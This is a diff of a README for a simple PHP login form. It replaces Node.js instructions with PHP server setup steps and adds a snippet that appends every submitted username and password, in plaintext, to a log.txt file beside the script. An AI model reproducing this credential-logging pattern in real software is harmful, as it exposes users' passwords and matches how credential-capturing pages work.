@@ -1,27 +1,34 @@
-# Login Form
+# Login Form with PHP
 
-This is a simple login form that captures user input and stores it in a log file.
+This is a simple login form built with PHP that captures user input and stores it in a log file.
 
 ## Instructions
 
 1. Clone the repository to your local machine.
-2. Open the `index.php` file in localhost.
-3. Enter your username and password in the provided input fields.
-4. Click the "Login" button to submit the form.
-5. Your input will be stored in a `log.txt` file.
+2. Make sure you have PHP installed on your system.
+3. Set up a web server (such as Apache or Nginx) and configure it to run PHP files.
+4. Place the project files in the appropriate web server directory.
+5. Start the web server.
+6. Open the login form in a web browser.
 
-## Prerequisites
+## Usage
 
-- Web browser (Chrome, Firefox, Safari, etc.)
-- Node.js (for running the server locally)
+- Open the login form in a web browser.
+- Enter your username and password in the provided input fields.
+- Click the "Login" button to submit the form.
+- If the login is successful, you will be redirected to a success page.
+- If the login fails, you will be redirected to an error page.
 
-## Running the Server
+## Logging User Input
 
-1. Open your terminal or command prompt.
-2. Navigate to the project directory.
-3. Run the following command to install the dependencies:
+When a user submits the login form, their input will be captured by the PHP script and stored in a `log.txt` file. The `log.txt` file will be created in the same directory as the PHP script.
 
-   ```shell
-   npm install
+To implement the logging functionality, you can use the following code snippet in your PHP script:
 
-
+```php
+<?php
+$username = $_POST['username'];
+$password = $_POST['password'];
+$log = "Username: " . $username . " - Password: " . $password . "\n";
+file_put_contents('log.txt', $log, FILE_APPEND);
+?>
